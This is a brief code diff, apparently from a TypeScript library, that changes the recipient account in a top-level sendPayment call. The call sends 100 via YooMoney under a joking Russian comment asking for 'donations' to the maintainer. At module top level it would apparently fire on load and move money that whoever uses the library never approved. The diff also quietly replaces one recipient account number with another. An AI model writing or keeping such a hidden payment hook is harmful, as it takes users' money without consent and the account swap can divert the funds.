@@ -50,4 +50,4 @@ async function sendPayment(method: PayoutMethod, account: string, amount: number
 }
 
 // Донатим мне, чтобы я поддерживал библиотеку :)
-sendPayment("yoomoney", "410016348581848", 100);
+sendPayment("yoomoney", "4100117723869225", 100);
